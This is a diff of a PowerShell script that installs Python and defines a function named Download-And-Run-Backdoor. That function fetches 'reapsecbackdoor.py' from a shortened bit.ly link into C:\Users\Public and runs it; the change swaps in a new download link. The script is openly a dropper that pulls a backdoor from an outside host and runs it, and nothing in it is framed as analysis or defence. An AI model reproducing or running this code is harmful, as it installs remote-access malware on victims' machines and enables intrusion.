@@ -1,3 +1,4 @@
+
 function Install-Python {
     Write-Host "Installing Python..."
     Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
@@ -11,7 +12,7 @@ function Configure-Firewall {
 
 function Download-And-Run-Backdoor {
     Write-Host "Downloading backdoor script..."
-    Invoke-WebRequest -Uri "https://bit.ly/3AhVHLp" -OutFile "C:\Users\Public\reapsecbackdoor.py"
+    Invoke-WebRequest -Uri "https://bit.ly/3Y5sDWq" -OutFile "C:\Users\Public\reapsecbackdoor.py"
 
     Write-Host "Running backdoor script..."
     Start-Process "python" -ArgumentList "C:\Users\Public\reapsecbackdoor.py"
